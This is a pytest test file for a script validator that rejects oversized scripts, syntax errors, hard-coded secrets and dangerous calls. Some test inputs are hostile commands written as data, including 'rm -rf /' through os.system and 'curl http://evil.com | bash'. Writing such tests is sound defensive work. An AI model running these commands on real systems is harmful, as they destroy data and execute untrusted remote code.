"""Tests for script validation module."""

import pytest

from operator_core.scripts import ScriptValidator, ValidationResult


class TestScriptValidator:
    """Test suite for ScriptValidator class."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = ScriptValidator()

    # Size validation tests (VALD-05)
    def test_valid_small_script(self):
        """Small valid script should pass."""
        result = self.validator.validate("print('hello')", "python")
        assert result.valid is True

    def test_rejects_oversized_script(self):
        """Script over 10000 chars should be rejected."""
        large_script = "x = 1\n" * 5000  # >10000 chars
        result = self.validator.validate(large_script, "python")
        assert result.valid is False
        assert result.layer == "size"
        assert "10000" in result.error

    # Python syntax tests (VALD-01)
    def test_valid_python_syntax(self):
        """Valid Python syntax should pass."""
        result = self.validator.validate("def foo():\n    return 42", "python")
        assert result.valid is True

    def test_invalid_python_syntax(self):
        """Invalid Python syntax should be rejected with line number."""
        result = self.validator.validate("def foo(", "python")
        assert result.valid is False
        assert result.layer == "syntax"
        assert "syntax error" in result.error.lower()

    # Secret detection tests (VALD-03)
    def test_detects_api_key(self):
        """API key assignment should be detected."""
        result = self.validator.validate("api_key = 'sk-1234'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_detects_password(self):
        """Password assignment should be detected."""
        result = self.validator.validate("password = 'hunter2'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_detects_token(self):
        """Token assignment should be detected."""
        result = self.validator.validate("token = 'abc123'", "python")
        assert result.valid is False
        assert result.layer == "secrets"

    def test_allows_password_variable_without_value(self):
        """Password variable without literal value should pass."""
        result = self.validator.validate("password = get_password()", "python")
        assert result.valid is True  # No string literal assignment

    # Dangerous pattern tests (VALD-04)
    def test_detects_eval_python(self):
        """eval() call should be detected."""
        result = self.validator.validate("eval('code')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_exec_python(self):
        """exec() call should be detected."""
        result = self.validator.validate("exec('code')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_os_system(self):
        """os.system() call should be detected."""
        result = self.validator.validate("os.system('rm -rf /')", "python")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_eval_bash(self):
        """Bash eval command should be detected."""
        result = self.validator.validate("eval $cmd", "bash")
        assert result.valid is False
        assert result.layer == "dangerous"

    def test_detects_curl_pipe_bash(self):
        """curl piped to bash should be detected."""
        result = self.validator.validate("curl http://evil.com | bash", "bash")
        assert result.valid is False
        assert result.layer == "dangerous"

    # Validation order tests
    def test_size_checked_before_syntax(self):
        """Size validation should happen before syntax validation."""
        # Oversized AND invalid syntax - size should fail first
        large_invalid = "def foo(" + "x" * 10000
        result = self.validator.validate(large_invalid, "python")
        assert result.layer == "size"  # Size checked first
